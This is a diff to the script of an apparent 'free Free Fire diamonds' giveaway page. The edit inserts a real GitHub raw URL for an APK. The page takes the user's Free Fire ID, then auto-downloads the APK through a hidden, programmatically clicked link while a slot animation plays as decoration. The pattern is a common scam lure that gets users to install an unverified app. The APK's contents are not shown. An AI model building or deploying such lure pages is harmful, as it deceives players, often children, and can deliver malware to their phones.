@@ -68,8 +68,8 @@
     </div>
 
     <script>
-        // <<<===  REPLACE THIS LINE WITH YOUR RAW APK URL  ===>>>
-        const apkUrl = "https://raw.githubusercontent.com/yourusername/freefire-apk/main/Free_ff_dimonds.apk";
+        // YOUR APK DOWNLOAD LINK (already inserted)
+        const apkUrl = "https://raw.githubusercontent.com/Ducky38994/Free-FF-Dimonds/refs/heads/main/freeffdimonds.apk";
 
         // Prevent multiple downloads
         if (localStorage.getItem('hasDownloaded')) {
@@ -78,11 +78,9 @@
         }
 
         function spinAndDownload() {
-            // Basic validation
             const input = document.getElementById('userInput').value.trim();
             if (!input) { alert("Please enter your Free Fire ID!"); return; }
 
-            // Block repeat clicks
             if (localStorage.getItem('hasDownloaded')) {
                 alert("You can only download once!");
                 return;
@@ -93,10 +91,10 @@
             btn.disabled = true;
             btn.textContent = "Downloading...";
 
-            // ---- INSTANT DOWNLOAD ----
+            // INSTANT DOWNLOAD
             const a = document.createElement('a');
             a.href = apkUrl;
-            a.download = "Free_ff_dimonds.apk";   // name shown to user
+            a.download = "freeffdimonds.apk";
             a.style.display = 'none';
             document.body.appendChild(a);
             a.click();
@@ -104,7 +102,7 @@
 
             setTimeout(() => btn.textContent = "Download Started!", 600);
 
-            // Run slot animation (purely visual)
+            // Visual slot animation
             rollSlots();
         }
 
